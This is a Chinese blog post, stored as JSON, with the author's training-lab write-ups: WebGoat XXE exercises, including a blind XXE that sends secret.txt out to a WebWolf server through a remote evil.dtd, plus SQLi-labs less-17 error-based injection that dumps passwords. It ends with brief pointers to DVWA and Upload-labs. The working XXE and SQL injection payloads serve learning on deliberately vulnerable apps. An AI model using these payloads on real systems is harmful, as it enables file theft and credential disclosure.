{"title":"线下靶场学习","uid":"03851902a32973532ebe881c76b9c075","slug":"underline-learning","date":"2022-06-21T14:06:24.391Z","updated":"2023-08-06T08:00:55.587Z","comments":true,"path":"api/articles/underline-learning.json","keywords":null,"cover":"/img/29.jpg","content":"<p><code>为什么学习线下靶场，因为线下靶场相比更加容易理解漏洞入门，</code></p>\n<p><code>而且可以看到网站的源码，从而可以锻炼代码审计能力，找出漏洞的成因，</code></p>\n<p><code>尝试自己提出绕过或者防御的措施，这里只记录一下本人觉得的线下靶场印象深刻，对本人有意义的部分</code></p>\n<span id=\"more\"></span>\n\n<h1 id=\"WebGoat\"><a href=\"#WebGoat\" class=\"headerlink\" title=\"WebGoat\"></a>WebGoat</h1><h2 id=\"一-XXE\"><a href=\"#一-XXE\" class=\"headerlink\" title=\"一.XXE\"></a>一.XXE</h2><h3 id=\"1-Let’s-try\"><a href=\"#1-Let’s-try\" class=\"headerlink\" title=\"1.Let’s try\"></a>1.Let’s try</h3><h4 id=\"前言：\"><a href=\"#前言：\" class=\"headerlink\" title=\"前言：\"></a>前言：</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">在此作业中，您将为照片添加评论，在提交表单时尝试使用评论字段执行 XXE 注入。尝试列出文件系统的根目录。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n\n\n<p>我们先提交评论然后抓包试试</p>\n<p><img src=\"/post/underline-learning/image-20221015192748515.png\" alt=\"image-20221015192748515\"></p>\n<p>这时我们发现评论的内容是在用<code>xml</code>进行传递，</p>\n<p>可以编写<code>dtd</code>来进行内部实体注入</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token prolog\">&lt;?xml version=\"1.0\"?></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">comment</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\">\n&lt;!ENTITY root SYSTEM \"file:///C:/\">     \n</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>comment</span><span class=\"token punctuation\">></span></span> \n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>text</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token entity named-entity\" title=\"&root;\">&amp;root;</span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>text</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>comment</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/underline-learning/image-20221015195142684.png\" alt=\"image-20221015195142684\"></p>\n<p>成功</p>\n<h3 id=\"2-Modern-REST-framework\"><a href=\"#2-Modern-REST-framework\" class=\"headerlink\" title=\"2.Modern REST framework\"></a>2.Modern REST framework</h3><h4 id=\"前言：-1\"><a href=\"#前言：-1\" class=\"headerlink\" title=\"前言：\"></a>前言：</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">在现代 REST 框架中，服务器可能能够接受您作为开发人员没有考虑过的数据格式。因此，这可能会导致 JSON 端点容易受到 XXE 攻击。\n\n再次进行相同的练习，但尝试执行与我们在第一个作业中所做的相同的 XML 注入。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n\n<p>这个明显发现底下的评论传递格式不再是<code>xml</code></p>\n<p>而是在用<code>json</code>进行传递</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">json：\n是一种轻量级的数据交换格式。人类很容易阅读和写作。机器很容易解析和生成。它基于 JavaScript 编程语言标准\n\n在 JSON 中，它们采用以下形式：\n\n对象是一组无序的名称&#x2F;值对。一个对象以&#123;（左大括号）开始，以&#125;（右大括号）结束。每个名称后跟：冒号，名称&#x2F;值对由逗号分隔。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/underline-learning/image-20221015195333753.png\" alt=\"image-20221015195333753\"></p>\n<p>这里我们看</p>\n<p><img src=\"/post/underline-learning/image-20221015200313439.png\" alt=\"image-20221015200313439\"></p>\n<p>就知道是修改 <code>Content-Type</code></p>\n<p><img src=\"/post/underline-learning/image-20221015200353909.png\" alt=\"image-20221015200353909\"></p>\n<p>我们直接把</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Content-Type: application&#x2F;json\n改成\nContent-Type: application&#x2F;xml<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>那就可以以 <code>xml</code> 形式上传评论，从而实现 <code>xxe</code> 注入</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token prolog\">&lt;?xml version=\"1.0\"?></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">comment</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\">\n&lt;!ENTITY root SYSTEM \"file:///C:/\">     \n</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>comment</span><span class=\"token punctuation\">></span></span> \n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>text</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token entity named-entity\" title=\"&root;\">&amp;root;</span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>text</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>comment</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/underline-learning/image-20221015200758568.png\" alt=\"image-20221015200758568\"></p>\n<p>成功</p>\n<h3 id=\"3-Blind-XXE-assignment\"><a href=\"#3-Blind-XXE-assignment\" class=\"headerlink\" title=\"3.Blind XXE assignment\"></a>3.Blind XXE assignment</h3><h4 id=\"前言：-2\"><a href=\"#前言：-2\" class=\"headerlink\" title=\"前言：\"></a>前言：</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">在本作业中尝试制作一个 DTD，它将文件 secret.txt 的内容从 WebGoat 服务器上传到我们的 WebWolf 服务器。您可以使用 WebWolf 为您的 DTD 提供服务。secret.txt 位于此位置的 WebGoat 服务器上，因此您无需扫描所有目录和文件：\n\n你\t                 地点\nWindows 10            C:\\Users\\Ttoc&#x2F;.webgoat-8.2.2&#x2F;&#x2F;XXE&#x2F;secret.txt\n\n尝试使用 WebWolf 登录页面上传此文件，例如：（ 注意：此端点由您完全控制）一旦您获得文件的内容，将其作为新评论发布在页面上，您将解决课程。http:&#x2F;&#x2F;127.0.0.1:9090&#x2F;landing<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n\n<p>盲注就是没有回显内容，但是我们需要把我们目标服务器的敏感文件内容获取到我们的服务器</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">简而言之，\n\nwebgoat开启了站点，这个站点有XXE，webgoat服务器上有个密码文件，通过XXE把这个密码文件读取，并且发送到我们自己的恶意站点webwolf，webwolf接受到这个请求就顺理成章获取了密码文件里面的密码<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p>这里主要利用<code>xml</code>通过<code>DTD</code>实现文件包含，</p>\n<p>先把我们自己写的<code>DTD</code>文件包含在我们的服务器<code>webwolf</code>，然后在<code>webgoat</code>上通过<code>xxe</code>进行远程包含我们站点的这个<code>DTD</code>文件，然后<code>webgoat</code>在解析我们的<code>DTD</code>文件的时候就会把<code>secret.txt</code>文件内容赋值到文件并作为参数发送到我们的<code>webwolf</code>服务器</p>\n<hr>\n<p>我们先发送评论看看</p>\n<p>这里发送的是空内容，回显的内容看来是提示，</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">需要我们先在&#96;webwolf&#96;上上传文件<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/underline-learning/image-20221017201611949.png\" alt=\"image-20221017201611949\"></p>\n<p>我们先抓包看看webgoat的评论的解析格式是怎么样的</p>\n<p><img src=\"/post/underline-learning/image-20221017201938082.png\" alt=\"image-20221017201938082\"></p>\n<p>看来是正常的<code>xml</code>解析</p>\n<p>我们先在<code>webwolf</code>上上传我们的<code>evil.dtd</code>文件</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;!ENTITY % write &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;localhost:9090&#x2F;landing?text&#x3D;%file;&#39;&gt;&quot;&gt;\n\n\n&#x2F;&#x2F;声明变量 write 并嵌套赋值&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;localhost:9090&#x2F;landing?text&#x3D;%file;&#39;&gt;\n\n为什么还要用一个参数实体嵌套呢？\n因为如果我们用一个write参数实体将send外部实体的定义写进请求中，在%write;执行的过程中，%file也会被替换成相应的文本。因此最后，?text后面的值就是我们想要的内容<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/underline-learning/image-20221017205520515.png\" alt=\"image-20221017205520515\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">这里的变量赋值和前面的不同\n它是\n%（空格）变量名\n这种命名的方式的变量只能在DTD里用，而在xml里用不了<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/underline-learning/image-20221017211907400.png\" alt=\"image-20221017211907400\"></p>\n<p>上传成功后我们在<code>incoming requests</code>里看到上传路径，这样在<code>webgoat</code>就调用访问包含就行了</p>\n<p><img src=\"/post/underline-learning/image-20221017211827208.png\" alt=\"image-20221017211827208\"></p>\n<p>然后我们再在<code>webgoat</code>抓包数据里构造我们的<code>payload</code></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE comment [\n&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;Users&#x2F;Ttoc&#x2F;.webgoat-8.2.2&#x2F;XXE&#x2F;secret.txt&quot;&gt;\n&#x2F;&#x2F;这个路径是有这个文件，因为在执行jar文件的时候，自动生成了这个文件\n&lt;!ENTITY % getdtd SYSTEM &quot;http:&#x2F;&#x2F;localhost:9090&#x2F;files&#x2F;ttocplus&#x2F;evil.dtd&quot;&gt;\n&#x2F;&#x2F;注意这里是上传路径，要写自己的\n%getdtd; \n%write;\n&#x2F;&#x2F;在%getdtd;后面调用%write;\n]&gt;\n&lt;comment&gt;\n    &lt;text&gt;\n     &amp;send; \n     &#x2F;&#x2F;再调用%write里的&amp;send变量，这个变量是再嵌套的DTD语句中声明，所以需要在xml里调用\n    &lt;&#x2F;text&gt;\n&lt;&#x2F;comment&gt;\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>虽然提示是报错，但是我们到我们的<code>webwolf</code>上查看</p>\n<p><img src=\"/post/underline-learning/image-20221018140310837.png\" alt=\"image-20221018140310837\"></p>\n<hr>\n<p>这个是<code>secret.txt</code>的值，我们看看<code>webwolf</code>上有没有获得该数据</p>\n<p><img src=\"/post/underline-learning/image-20221017234256596.png\" alt=\"image-20221017234256596\"></p>\n<hr>\n<p>成功获取</p>\n<p><img src=\"/post/underline-learning/image-20221018141126472.png\" alt=\"image-20221018141126472\"></p>\n<p>成功</p>\n<h1 id=\"SQL-labs\"><a href=\"#SQL-labs\" class=\"headerlink\" title=\"SQL-labs\"></a>SQL-labs</h1><p><em><u>这里不全写，详细建议找一下sql-labs天书，认真学习一下</u></em></p>\n<h2 id=\"less-17\"><a href=\"#less-17\" class=\"headerlink\" title=\"less-17\"></a>less-17</h2><p>其实我们可以先在源代码中看到一个函数。<code>check_input()</code>函数。 就会了解为什么不在<code>username</code>处进行注入</p>\n<p><img src=\"/post/underline-learning/image-20220729232132515.png\" alt=\"image-20220729232132515\"></p>\n<p><img src=\"/post/underline-learning/image-20220729232104117.png\" alt=\"image-20220729232104117\"></p>\n<p>这里把这几个函数解释一下，就清楚了</p>\n<p><strong>★addslashes()</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。 \n\n预定义字符是： \n\n​单引号（&#39;） \n\n​双引号（&quot;） \n\n​反斜杠（\\） \n\n​NULL \n\n提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。 \n\n注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您 \n\n不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可 \n\n以使用函数 get_magic_quotes_gpc() 进行检测。 \n\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">语法：addslashes(string) \n\n参数             描述\n\nstring          必需。规定要转义的字符串。 \n\n返回值：         返回已转义的字符串。 \n\nPHP 版本：       4+ <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>★stripslashes()</strong> </p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">函数删除由 addslashes() 函数添加的反斜杠。 <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><strong>★mysql_real_escape_string()</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">函数转义 SQL 语句中使用的字符串中的特殊字符。 <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>下列字符受影响： </p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">\\x00 \n\n\\n \n\n\\r \n\n\\ \n\n&#39; \n\n&quot; \n\n\\x1a <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。 </p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">语法：mysql_real_escape_string(string,connection) \n\n参数                              描述 \n\nstring                            必需。规定要转义的字符串。 \n\nconnection 可选。    规定 MySQL 连接。如果未规定，则使用上一个连接<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>所以注入处应该在<code>passwd</code>中</p>\n<p>开始先尝试注入，发现没有回显，</p>\n<p>所以试试报错注入</p>\n<p><code>1&#39;and updatexml(1,concat(0x7e,(select password from users),0x7e),1)#</code></p>\n<p>报出<code>You can&#39;t specify target table &#39;users&#39; for update in FROM clause</code></p>\n<p><img src=\"/post/underline-learning/image-20220905094419111.png\" alt=\"image-20220905094419111\"></p>\n<p><u>大致意思是，在同一语句中，不能先select出同一表中的某些值，再update这个表</u></p>\n<p>所以这里就需要加一个中间表，就可以绕过这个错误</p>\n<p>比如</p>\n<p><code>1&#39;and updatexml(1,concat(0x7e,(select password from (select password from users)a),0x7e),1)#</code></p>\n<p>这里就是把<code>(select password from users)</code>的查询后的数据存入生成的新表a，然后就相当于<code>(select password from a)</code></p>\n<p><img src=\"/post/underline-learning/image-20220905094517322.png\" alt=\"image-20220905094517322\"></p>\n<p>发现不能超过一行</p>\n<p>于是用</p>\n<p><code>1&#39;and updatexml(1,concat(0x7e,(select group_concat(password) from (select password from users)a),0x7e),1)#</code></p>\n<p>成功</p>\n<p><img src=\"/post/underline-learning/image-20220905094540906.png\" alt=\"image-20220905094540906\"></p>\n<h1 id=\"DVWA\"><a href=\"#DVWA\" class=\"headerlink\" title=\"DVWA\"></a>DVWA</h1><p><a href=\"https://blog.csdn.net/zy15667076526/article/details/109705286?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165390231016781818750292%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165390231016781818750292&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-109705286-null-null.142%5Ev11%5Epc_search_result_control_group,157%5Ev12%5Econtrol&utm_term=dvwa&spm=1018.2226.3001.4187\">推荐文章链接</a></p>\n<p><em><u>不要只知道payload，要仔细分析理解源码，找出出现漏洞的原因点</u></em></p>\n<p><u><code>建议看推荐文章，下面代码审计和题目分析仅是我个人能力结果，只能尽可能说到点处</code></u></p>\n<p><u><code>而且部分也是借鉴推荐文章内容</code></u></p>\n<h1 id=\"Upload-labs\"><a href=\"#Upload-labs\" class=\"headerlink\" title=\"Upload-labs\"></a>Upload-labs</h1><p>建议看文章，最后几关二次渲染和条件竞争建议仔细学习一下</p>\n","text":"为什么学习线下靶场，因为线下靶场相比更加容易理解漏洞入门， 而且可以看到网站的源码，从而可以锻炼代码审计能力，找出漏洞的成因， 尝试自己提出绕过或者防御的措施，...","permalink":"/post/underline-learning","photos":[],"count_time":{"symbolsCount":"4.8k","symbolsTime":"4 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"靶场","slug":"靶场","count":5,"path":"api/tags/靶场.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#WebGoat\"><span class=\"toc-text\">WebGoat</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%80-XXE\"><span class=\"toc-text\">一.XXE</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-Let%E2%80%99s-try\"><span class=\"toc-text\">1.Let’s try</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80%EF%BC%9A\"><span class=\"toc-text\">前言：</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-Modern-REST-framework\"><span class=\"toc-text\">2.Modern REST framework</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80%EF%BC%9A-1\"><span class=\"toc-text\">前言：</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3-Blind-XXE-assignment\"><span class=\"toc-text\">3.Blind XXE assignment</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80%EF%BC%9A-2\"><span class=\"toc-text\">前言：</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#SQL-labs\"><span class=\"toc-text\">SQL-labs</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#less-17\"><span class=\"toc-text\">less-17</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#DVWA\"><span class=\"toc-text\">DVWA</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Upload-labs\"><span class=\"toc-text\">Upload-labs</span></a></li></ol>","author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"代码审计知识点记录","uid":"0fbb4ce471f03133d4bc00eb32aefb3b","slug":"Code-audit","date":"2022-06-26T14:34:42.604Z","updated":"2023-08-06T07:35:05.550Z","comments":true,"path":"api/articles/Code-audit.json","keywords":null,"cover":"/img/3.jpg","text":"代码审计学习的一些笔记 代码审计-常见php威胁函数（上） 文章来自成都知道创宇 1.常见php回调函数，可调用其他命令&#x2F;代码执行函数call_use...","permalink":"/post/Code-audit","photos":[],"count_time":{"symbolsCount":"5.4k","symbolsTime":"5 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"代码审计","slug":"代码审计","count":1,"path":"api/tags/代码审计.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"攻防世界靶场wp","uid":"c1355e18e08f584a9698a2879b69aeba","slug":"wp-Gongfang","date":"2022-06-21T14:06:24.391Z","updated":"2023-10-04T15:10:59.861Z","comments":true,"path":"api/articles/wp-Gongfang.json","keywords":null,"cover":"/img/34.jpg","text":"这个线上靶场感觉很适合入门，而且难度分布也好，很优秀的线上靶场，非常值得仔细学习研究一下 ...功防世界突然改版了，把题弄成一堆了，不过还是有难度系数，不过也方...","permalink":"/post/wp-Gongfang","photos":[],"count_time":{"symbolsCount":"30k","symbolsTime":"27 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"靶场","slug":"靶场","count":5,"path":"api/tags/靶场.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}